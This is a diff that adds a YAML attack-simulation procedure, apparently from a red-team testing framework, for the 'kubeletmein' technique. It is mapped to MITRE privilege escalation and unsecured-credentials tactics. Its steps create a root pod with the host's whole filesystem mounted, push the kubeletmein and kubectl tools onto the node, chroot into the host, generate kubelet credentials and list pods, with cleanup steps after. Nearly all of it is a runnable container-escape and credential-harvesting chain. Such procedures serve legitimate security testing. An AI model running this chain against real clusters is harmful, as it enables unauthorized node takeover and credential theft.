@@ -1,0 +1,148 @@
+---
+api_version: 2.0
+uuid: 678f2cf9-22dd-4d61-8ce7-d68cb3b54c31
+name: kubeletmein
+authors:
+  - I50
+description: |
+  This TTP demonstrates how to gain escalated privileges on a Kubernetes node from an insecure pod.
+  It creates a pod with root access, copies the [kubectl](https://kubernetes.io/docs/reference/kubectl/kubectl/)
+  and [kubeletmein](https://github.com/4ARMED/kubeletmein) tools to the pod, moves these tools to
+  the host node, generates Kubernetes credentials using kubeletmein, and uses kubectl with the new
+  credentials to interact with the Kubernetes cluster.
+args:
+  - name: artifacts_dir
+    description: The directory to store the downloaded tools.
+    default: /tmp
+  - name: eks_cluster
+    description: Target k8s cluster is running on EKS.
+    default: true
+  - name: insecure_container_image
+    description: The container image to employ for the insecure pod.
+    default: ubuntu:latest
+  - name: target_arch
+    description: The architecture the target k8s pod is running
+    default: amd64
+  - name: target_cluster
+    description: The target k8s cluster.
+  - name: target_ns
+    description: Namespace the insecure pod lives in.
+    default: default
+  - name: target_os
+    description: The operating system the target k8s pod is running
+    default: linux
+  - name: target_region
+    description: The region the target EKS cluster is in.
+    default: us-east-1
+requirements:
+  platforms:
+    - os: linux
+    - os: darwin
+mitre:
+  tactics:
+    - "TA0004 Privilege Escalation"
+    - "TA0007 Discovery"
+  techniques:
+    - "T1552 Unsecured Credentials"
+    - "T1087 Account Discovery"
+    - "T1082 System Information Discovery"
+
+steps:
+  {{ if .Args.eks_cluster }}
+  - name: aws_connector
+    description: This step invokes the setup_cloud_env action.
+    ttp: //utils/aws-validate-aws-env-configured/ttp.yaml
+    args:
+      region: "{{ .Args.target_region }}"
+
+  - name: setup_kubeconfig_for_eks
+    description: Set up kubeconfig for EKS cluster.
+    ttp: //utils/k8s-setup-kubeconfig-for-eks/ttp.yaml
+    args:
+      cluster_name: "{{ .Args.target_cluster }}"
+      cluster_region: "{{ .Args.target_region }}"
+  {{ end }}
+
+  - name: download-kubeletmein
+    description: Download the latest releases of kubeletmein from GitHub.
+    ttp: //utils/download-and-extract/ttp.yaml
+    args:
+      filename: kubeletmein
+      github: true
+      repo_owner: 4ARMED
+      repo_name: kubeletmein
+
+  - name: download-kubectl
+    description: Download the latest release of kubectl.
+    ttp: //utils/download-and-extract/ttp.yaml
+    args:
+      filename: kubectl
+      download_url: "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/{{ .Args.target_os}}/{{ .Args.target_arch }}/kubectl"
+
+  - name: create_insecure_pod_manifest
+    description: Create the manifest for the insecure pod.
+    inline: |
+      cat > {{ .Args.artifacts_dir }}/kubeletmein.yaml <<- EOF
+      apiVersion: v1
+      kind: Pod
+      metadata:
+        name: kubeletmein
+        labels:
+          app: kubeletmein
+      spec:
+        containers:
+        - name: kubeletmein
+          image: "{{ .Args.insecure_container_image }}"
+          securityContext:
+            runAsUser: 0
+          env:
+          - name: GRANT_SUDO
+            value: "1"
+          command: ["/bin/sleep", "3650d"]
+          imagePullPolicy: IfNotPresent
+          volumeMounts:
+          - name: root-fs
+            mountPath: /mnt
+        restartPolicy: Always
+        volumes:
+        - name: root-fs
+          hostPath:
+            path: /
+            type: Directory
+      EOF
+    cleanup:
+      inline: rm {{ .Args.artifacts_dir }}/kubeletmein.yaml
+
+  - name: create_insecure_pod
+    description: Create the insecure pod in the target namespace.
+    inline: kubectl create -f {{ .Args.artifacts_dir }}/kubeletmein.yaml
+    cleanup:
+      inline: kubectl delete -f {{ .Args.artifacts_dir }}/kubeletmein.yaml
+
+  - name: copy-tools-to-insecure-pod
+    description: Copy the downloaded tools to the insecure pod.
+    inline: |
+      for tool in kubeletmein kubectl; do
+        kubectl cp {{ .Args.artifacts_dir }}/$tool kubeletmein:/tmp/$tool
+      done
+
+  - name: move-tools-to-node
+    description: Move the tools from the insecure pod to the node.
+    inline: |
+      for tool in kubeletmein kubectl; do
+        kubectl exec -i kubeletmein -- mv /tmp/$tool /mnt
+      done
+
+  - name: configure-node-and-get-pods
+    description: Configure the node with credentials and get the pods in the target namespace.
+    inline: |
+      kubectl exec -i -f {{ .Args.artifacts_dir }}/kubeletmein.yaml -- chroot /mnt /bin/bash <<EOF
+      ./kubeletmein generate --provider {{ if .Args.eks_cluster }}eks{{ else }}autodetect{{ end }}
+      ./kubectl --kubeconfig ./kubeconfig.yaml get pods -n {{ .Args.target_ns }}
+      EOF
+    cleanup:
+      inline: |
+        # Remove artifacts from the node
+        kubectl exec -i -f {{ .Args.artifacts_dir }}/kubeletmein.yaml -- chroot /mnt /bin/bash <<"EOT"
+        rm kubeletmein kubeconfig.yaml kubectl
+        EOT
